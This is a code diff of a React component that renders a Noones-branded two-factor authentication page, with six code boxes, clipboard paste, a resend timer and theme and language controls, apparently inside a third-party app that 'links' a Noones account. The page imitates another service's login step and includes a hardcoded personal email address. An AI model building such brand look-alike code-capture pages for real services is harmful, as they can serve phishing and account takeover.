@@ -1,100 +1,264 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
+import { Sun, Moon, ChevronDown, ExternalLink } from 'lucide-react';
 
 export default function NoonesDeviceVerification() {
   const navigate = useNavigate();
   const location = useLocation();
-  const [resendTimer, setResendTimer] = useState(21);
+  const [code, setCode] = useState(['', '', '', '', '', '']);
+  const [resendTimer, setResendTimer] = useState(54);
+  const [isDarkMode, setIsDarkMode] = useState(false);
+  const [language, setLanguage] = useState('English');
+  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  // Get email from location state
   const email = location.state?.email || 'gibsonkobia@gmail.com';
 
-  // Timer for "Resend email" button
+  // Timer countdown
   useEffect(() => {
     if (resendTimer <= 0) return;
     const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
     return () => clearTimeout(timer);
   }, [resendTimer]);
 
-  const handleResendEmail = () => {
-    setResendTimer(21);
-    // TODO: Implement resend email logic
+  const handleCodeChange = (index: number, value: string) => {
+    // Only allow digits
+    if (!/^\d*$/.test(value)) return;
+
+    const newCode = [...code];
+    newCode[index] = value.slice(0, 1); // Only one digit per box
+    setCode(newCode);
+
+    // Auto-focus to next input
+    if (value && index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
   };
 
-  const handleTryAnotherWay = () => {
-    navigate('/connect/noones');
+  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace' && !code[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
   };
 
-  const handleCancelSignIn = () => {
-    navigate('/');
+  const handlePaste = async () => {
+    try {
+      const clipboardText = await navigator.clipboard.readText();
+      const digits = clipboardText.replace(/\D/g, '').slice(0, 6);
+      
+      if (digits.length > 0) {
+        const newCode = [...code];
+        for (let i = 0; i < Math.min(digits.length, 6); i++) {
+          newCode[i] = digits[i];
+        }
+        setCode(newCode);
+        
+        // Focus last input or next empty input
+        if (digits.length < 6) {
+          inputRefs.current[digits.length]?.focus();
+        } else {
+          inputRefs.current[5]?.focus();
+        }
+      }
+    } catch (err) {
+      console.error('Failed to read clipboard:', err);
+    }
   };
+
+  const handleResend = () => {
+    setResendTimer(54);
+    setCode(['', '', '', '', '', '']);
+    inputRefs.current[0]?.focus();
+    // TODO: Implement resend code logic
+  };
+
+  const handleContinue = async () => {
+    const verificationCode = code.join('');
+    if (verificationCode.length !== 6) {
+      alert('Please enter all 6 digits');
+      return;
+    }
+
+    try {
+      // TODO: Verify code with backend
+      navigate('/link-success');
+    } catch (err) {
+      alert('Verification failed. Please try again.');
+    }
+  };
+
+  const isComplete = code.every((digit) => digit !== '');
+  const bgColor = isDarkMode ? 'bg-[#0f0f0f]' : 'bg-[#f8f9fa]';
+  const textColor = isDarkMode ? 'text-white' : 'text-gray-900';
 
   return (
-    <div className="min-h-screen bg-[#0f0f0f] flex flex-col items-center pt-12 font-sans text-white">
-      <div className="mb-8">
-        <h1 className="text-4xl font-black text-[#4ade80] tracking-tight">noones</h1>
+    <div className={`${bgColor} min-h-screen flex flex-col items-center justify-center p-4 font-sans transition-colors duration-300`}>
+      {/* Main Card */}
+      <div className={`w-full max-w-[450px] ${isDarkMode ? 'bg-[#1e1e1e]' : 'bg-white'} rounded-xl shadow-md p-8 sm:p-10`}>
+        {/* Logo */}
+        <div className="text-center mb-8">
+          <h1 className="text-3xl font-bold text-[#00c281]">noones</h1>
+        </div>
+
+        {/* Title */}
+        <h2 className={`text-2xl font-bold text-center ${textColor} mb-2`}>
+          Two-factor authentication
+        </h2>
+
+        {/* Subtitle */}
+        <p className={`text-center ${isDarkMode ? 'text-gray-500' : 'text-gray-600'} mb-8`}>
+          Enter 6-digit code sent to{' '}
+          <span className={`font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-900'}`}>
+            {email}
+          </span>
+        </p>
+
+        {/* Code Input Grid */}
+        <div className="flex justify-center gap-3 mb-6">
+          {code.map((digit, index) => (
+            <input
+              key={index}
+              ref={(el) => (inputRefs.current[index] = el)}
+              type="text"
+              inputMode="numeric"
+              maxLength={1}
+              value={digit}
+              onChange={(e) => handleCodeChange(index, e.target.value)}
+              onKeyDown={(e) => handleKeyDown(index, e)}
+              className={`w-12 h-16 text-center text-xl font-bold rounded-lg outline-none transition-all ${
+                isDarkMode
+                  ? `${digit ? 'bg-[#2a2a2a]' : 'bg-[#e9ecef]'} text-white border-2 border-transparent`
+                  : `${digit ? 'bg-[#e9ecef]' : 'bg-[#e9ecef]'} text-gray-900 border-2 border-transparent`
+              }`}
+              placeholder="—"
+              autoComplete="off"
+            />
+          ))}
+        </div>
+
+        {/* Paste Button */}
+        <div className="flex justify-center mb-6">
+          <button
+            onClick={handlePaste}
+            className={`px-4 py-2 rounded-full text-sm font-medium transition-colors ${
+              isDarkMode
+                ? 'bg-[#2a2a2a] hover:bg-[#333333] text-gray-300'
+                : 'bg-[#f1f3f5] hover:bg-[#e9ecef] text-gray-700'
+            }`}
+          >
+            Paste
+          </button>
+        </div>
+
+        {/* Timer */}
+        <p className={`text-center text-sm mb-8 ${isDarkMode ? 'text-gray-500' : 'text-gray-600'}`}>
+          Resend in {resendTimer} seconds
+        </p>
+
+        {/* Continue Button */}
+        <button
+          onClick={handleContinue}
+          disabled={!isComplete}
+          className={`w-full h-12 rounded-lg font-semibold transition-all mb-6 ${
+            isComplete
+              ? isDarkMode
+                ? 'bg-[#00c281] hover:bg-[#00b873] text-white cursor-pointer'
+                : 'bg-[#00c281] hover:bg-[#00b873] text-white cursor-pointer'
+              : isDarkMode
+              ? 'bg-[#2a2a2a] text-gray-500 cursor-not-allowed'
+              : 'bg-[#e9ecef] text-gray-400 cursor-not-allowed'
+          }`}
+        >
+          Continue
+        </button>
+
+        {/* Support Link */}
+        <p className={`text-center text-sm ${isDarkMode ? 'text-gray-500' : 'text-gray-600'}`}>
+          If you need to reset 2FA, please{' '}
+          <a href="#support" className="text-[#00c281] hover:underline font-medium inline-flex items-center gap-1">
+            contact support <ExternalLink size={12} className="inline" />
+          </a>
+        </p>
       </div>
 
-      <div className="w-full max-w-md bg-[#1e1e1e] rounded-xl p-8 mx-4 shadow-2xl">
-        <div className="text-center">
-          <h2 className="text-2xl font-bold mb-4">New device detected</h2>
-          <p className="text-gray-400 text-sm mb-6">
-            Confirm this is your device from the email we just sent to 
-            <span className="block font-medium text-gray-300">{email}</span>
-          </p>
-
-          <div className="flex justify-center mb-6 opacity-40">
-            <svg className="w-24 h-24" fill="currentColor" viewBox="0 0 24 24">
-              <path d="M20 18h-1V6c0-1.1-.9-2-2-2H7c-1.1 0-2 .9-2 2v12H4c-1.1 0-2 .9-2 2h20c0-1.1-.9-2-2-2zm-13-12h10v12H7V6z"/>
-            </svg>
+      {/* Footer Controls */}
+      <div className="w-full max-w-[450px] flex justify-between items-center mt-8 px-4">
+        {/* Theme Toggle */}
+        <div
+          className={`flex items-center gap-2 p-2 rounded-full cursor-pointer transition-colors ${
+            isDarkMode
+              ? 'bg-[#1e1e1e] hover:bg-[#2a2a2a]'
+              : 'bg-gray-100 hover:bg-gray-200'
+          }`}
+          onClick={() => setIsDarkMode(!isDarkMode)}
+        >
+          <Sun
+            size={18}
+            className={`transition-colors ${
+              isDarkMode ? 'text-gray-600' : 'text-yellow-500'
+            }`}
+          />
+          <div
+            className={`w-10 h-5 rounded-full transition-all ${
+              isDarkMode ? 'bg-[#00c281]' : 'bg-gray-300'
+            } relative`}
+          >
+            <div
+              className={`absolute top-0.5 w-4 h-4 bg-white rounded-full transition-all ${
+                isDarkMode ? 'right-0.5' : 'left-0.5'
+              }`}
+            />
           </div>
+          <Moon
+            size={18}
+            className={`transition-colors ${
+              isDarkMode ? 'text-gray-400' : 'text-gray-400'
+            }`}
+          />
+        </div>
 
-          <p className="text-gray-300 font-medium mb-8">We don't recognize this device</p>
+        {/* Language Selector */}
+        <div className="relative">
+          <button
+            onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
+            className={`flex items-center gap-2 px-3 py-2 rounded transition-colors ${
+              isDarkMode
+                ? 'text-gray-400 hover:text-gray-200'
+                : 'text-gray-600 hover:text-gray-900'
+            }`}
+          >
+            <span className="text-sm font-medium">{language}</span>
+            <ChevronDown size={16} />
+          </button>
 
-          <div className="space-y-4">
-            <button 
-              onClick={handleResendEmail}
-              disabled={resendTimer > 0}
-              className={`w-full py-4 font-bold rounded-xl transition-colors ${
-                resendTimer > 0 
-                  ? 'bg-[#333333] text-gray-400 cursor-not-allowed' 
-                  : 'bg-[#333333] hover:bg-[#444444] text-gray-400'
+          {showLanguageDropdown && (
+            <div
+              className={`absolute top-full right-0 mt-1 rounded shadow-lg z-10 ${
+                isDarkMode ? 'bg-[#1e1e1e]' : 'bg-white'
               }`}
             >
-              Resend email ({resendTimer} sec.)
-            </button>
-            
-            <button 
-              onClick={handleTryAnotherWay}
-              className="w-full py-4 bg-[#2a2a2a] hover:bg-[#353535] text-white font-bold rounded-xl border border-gray-700 transition-colors"
-            >
-              Try another way
-            </button>
-
-            <div className="pt-4">
-              <a 
-                href="#" 
-                onClick={handleCancelSignIn}
-                className="text-[#4ade80] font-medium hover:underline"
-              >
-                Cancel signing in
-              </a>
+              {['English', 'Spanish', 'French', 'German'].map((lang) => (
+                <button
+                  key={lang}
+                  onClick={() => {
+                    setLanguage(lang);
+                    setShowLanguageDropdown(false);
+                  }}
+                  className={`block w-full text-left px-4 py-2 text-sm transition-colors ${
+                    language === lang
+                      ? isDarkMode
+                        ? 'bg-[#00c281] text-white'
+                        : 'bg-[#00c281] text-white'
+                      : isDarkMode
+                      ? 'text-gray-300 hover:bg-[#2a2a2a]'
+                      : 'text-gray-700 hover:bg-gray-100'
+                  }`}
+                >
+                  {lang}
+                </button>
+              ))}
             </div>
-          </div>
-        </div>
-      </div>
-
-      <div className="mt-auto w-full max-w-md flex justify-between p-6 items-center">
-        <div className="flex items-center space-x-3 bg-[#1e1e1e] p-1 rounded-full px-2 border border-gray-800">
-          <span className="text-yellow-500">☀️</span>
-          <div className="w-12 h-6 bg-[#4ade80] rounded-full relative">
-            <div className="absolute right-1 top-1 w-4 h-4 bg-white rounded-full"></div>
-          </div>
-          <span className="text-gray-500">🌙</span>
-        </div>
-
-        <div className="text-[#4ade80] flex items-center cursor-pointer">
-          English <span className="ml-1 text-xs text-[#4ade80]">▼</span>
+          )}
         </div>
       </div>
     </div>
